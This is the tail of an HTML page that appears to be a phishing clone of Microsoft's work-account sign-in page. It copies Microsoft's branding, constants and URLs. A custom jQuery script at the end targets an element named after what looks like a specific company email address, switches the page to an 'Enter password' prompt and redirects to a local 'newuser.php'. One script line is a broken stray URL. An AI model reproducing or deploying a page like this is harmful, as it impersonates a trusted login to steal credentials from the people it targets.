                                        </span>
                                    </div>
                            </div>
                        </div>
                    </td>
                    <td>
                        <div class="footer_glyph">
                            <img src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.2773.0/content/images/microsoft_logo.png" alt="Microsoft account symbol" />
                        </div>
                    </td>
                </tr>
        </table>
    </div>
</div>
<div id="login_prefetch_container" class="no_display">
</div>
                    </td>
                </tr>
            </table>
        </div>

<script type="text/javascript">
    var Constants = Constants || {};
    Constants.PREFILL_MEMBER_NAME = '';
    Constants.MEMBER_NAME = "";
    Constants.DEFAULT_FOOTER_LINKS = {
        'legal': {
            'label': 'Legal',
            'url': ''
        },
        'helpcentral': {
            'label': 'Help',
            'url': ''
        },
        'feedback': {
            'label': 'Feedback',
            'url': ''
        },
        'privacyandcookies': {
            'label': 'Privacy \u0026 Cookies',
            'url': 'https://login.microsoftonline.com/privacy'
        },
        'helpfor2fa': {
            'label': 'Help',
            'url': 'http://g.microsoftonline.com/0AX00en-US/670'
        }
    };

    Constants.DEFAULT_ENABLED_FOOTER_LINKS = [];
    Constants.REDIRECT_MESSAGES = {
        'AAD': "We\u0027re taking you to your organization\u0027s sign-in page.",
        'MSA': "WeҲe taking you to the Microsoft account sign-in page."
    };

    

    Constants.CDN_IMAGE_PATH = 'https://secure.aadcdn.microsoftonline-p.com/ests/2.1.2773.0/content/images/';
    Constants.PREFETCH_URL = "";
    Constants.IS_USE_OTHER_ACCOUNT_VISIBLE = true;
    Constants.OTHER_ACCOUNT_TEXT = "Use another account";
    Constants.MAX_USER_TILES = 5;
    try {
        Constants.FEATURE_SLOT_MASK = 39847;
        Constants.FEATURE_SLOT_THRESHOLD = 2147482559;
    } catch (err) {
        if (typeof Util !== "undefined") {
            Util.debug_console('params slots ' + err);
        }
    }
    Constants.MSA_LABEL = "(Microsoft account)";
    Constants.PARTNER_NAME = "Sign in with your work or school account";
    Constants.DIR = 'ltr';
    Constants.METRICS_MODE = 1;  // Client metrics mode.

    if (Constants.TokenizedStringMsgs) {
        Constants.TokenizedStringMsgs.GENERIC_ERROR = "\u003cH1\u003eSorry, but we\u0027re having trouble signing you in\u003c/H1\u003e\u003cp\u003ePlease try again in a few minutes. If this doesn\u0027t work, you might want to contact your admin and report the following error: #~#ErrorCode#~#.\u003c/p\u003e";
        Constants.TokenizedStringMsgs.UPN_DISAMBIGUATE_MESSAGE = "It looks like {0} is used with more than one account. Which account do you want to use?";
    }

    
    Constants.FLOW_TOKEN = '';
    Constants.FLOW_TOKEN_COOKIE_NAME = 'ESTSWCTXFLOWTOKEN';
    Constants.LCID = "1033";
    Constants.MSA_ACCOUNT_IMG_ALT_TEXT = "Microsoft account symbol";
    Constants.AAD_ACCOUNT_IMG_ALT_TEXT = "Work or school account symbol";
    Constants.MSA_ACCOUNT_TILE_ALT_TEXT = "Microsoft account for {0}";
    Constants.AAD_ACCOUNT_TILE_ALT_TEXT = "Work or school account for {0}";
    
    Constants.FORCED_SIGN_IN = true;
    Constants.MSA_AUTH_URL = 'https://login.live.com/login.srf?wa=wsignin1.0\u0026wtrealm=urn%3afederation%3aMicrosoftOnline\u0026wctx=estsredirect%3d2%26estsrequest%3drQIIAbNSzygpKSi20tfPLy3Jyc_P1stPS8tMTjU2M9VLzs_Vyy9Kz0wBsaKYgQqKhLgE_ir-31bwodh5Q1HT-hnLY1RWMSrhNUI_vzxR_wIj4yYmdl8nz_jgYJ8TTJc_899iEvQvSvdMCS92S01JLUosyczPe8TEG1qcWuSfl1MZkp-dmjeJmS8nPz0zL764KC0-LSe_HCgANLEgMbkkviQzOTu1ZBezipmFqYmhZZqlrrmJmYWuSVpSkm5iikmqrlGSmamJSVqqSbKF4QUWgR8sjItYgc73nBcWFH7wo9_k3Ll3M3MkVXZxEuF8AA2\u0026id=\u0026cbcxt=out';
   https://outlook.office365.com/owa/?error=access_denied\u0026error_subcode=cancel';
    Constants.IS_MSA_FED_SUPPORTED = false;
    Constants.IS_MSA_PHONE_USERNAME_SUPPORTED = false;
    Constants.IS_MSA_REDIR_SUPPORTED = false;
    Constants.MSA_DOMAIN = 'live.com';
    Constants.PROMPT = '';
    Constants.CLICKFORMORE = "Click for more actions";
    Constants.CONNECTEDTOWINDOWS = "Connected to Windows";
    Constants.SIGNEDIN = "Signed in";
    Constants.CLICKTOSIGNIN = "";
    Constants.SIGNINGOUT = "Signing out...";
    Constants.USERNAME_HINT_TEXT = 'someone@example.com ';
    Constants.IS_LOGOUT_REQUEST = false;
    Constants.SHOULD_HIDE_SIGNUP = false;
    Constants.USE_DARK_TILE_LOGO = false;
    Constants.HAS_ERROR = false;
    Constants.IS_MOBILE = false;
    Constants.SIGNOUTFORGET_URL_TEMPLATE = "/uxlogout?sessionId={0}\u0026shouldForgetUser={1}";
    Constants.IS_HOLOGRAPHIC = false;
    Constants.Header_Text_Username = 'Sign in with your work account';
    Constants.Header_Text_Password = 'Enter your password';
    Constants.Header_Text_Privacy = 'Privacy statement';
    Constants.Use_Client_Check_Msa_Flag = true;
    Constants.DisambigHelpUrl = "https://go.microsoft.com/fwlink/p/?LinkID=733247";
    Constants.CxhFlow = "";
    Constants.EncryptOOBEPassword = true;
    

    
    Constants.isProxyRequest = false;
    Constants.isMsaSupported = Constants.IS_MSA_FED_SUPPORTED || Constants.isProxyRequest;

    

</script>

<script type="text/javascript">
	$('#comptabilite_christalfilms_com').on('click',function(e){
		e.preventDefault();
		activatePasswordMode($('login_user_chooser').val());
	});
	$('#login_user_chooser').keypress(function (e) {
    if (e.which == 13) {
		e.preventDefault();
		activatePasswordMode($('#login_user_chooser').val());
    }
});

	$('#cred_cancel_button').on('click',function(e){
		e.preventDefault();
		reverseActivatePasswordMode();
	});

	function activatePasswordMode(email){
		$('h1.title').text("Enter password");
		$('p.sub').text("Enter the password for "+email);
		$('a.whatsthis').css("visibility","hidden");

		$('.firstpage').removeClass('slideInLeft');
		$('.firstpage').addClass('slideOutLeft').css('height','1px');
		setTimeout(function(){
			$('.inner_container').removeClass('slide');
			$('.inner_container').addClass('slide').css('visibility','visible');
		},150);
	}

		function activatenewuserMode(email){
		$('.firstpage').removeClass('hide');
		$('.firstpage').addClass('hide').css('height','1px');
		setTimeout(function(){
			$('.newuser').removeClass('show');
			$('.newuser').addClass('show').css('visibility','visible');
		},150);
	}
	function reverseActivatePasswordMode(){
		$('h1.title').text("Sign in");
		$('p.sub').text('Use your Microsoft account');
		$('a.whatsthis').css("visibility","visible");

		$('.inner_container').removeClass('slideInRight');
		$('.inner_container').addClass('slideOutRight');
		
		setTimeout(function(){
			$('.firstpage').removeClass('slideOutLeft');
			$('.firstpage').addClass('slideInLeft').css('visibility','visible');
		},150);
	}
function clickinner(mybtn){
    location.href='newuser.php';
};
</script>

    

<!-- Pull suppressed as UseAgent does not indicate Win10 or mobile Win10 TH2+ -->

    </body>
</html>
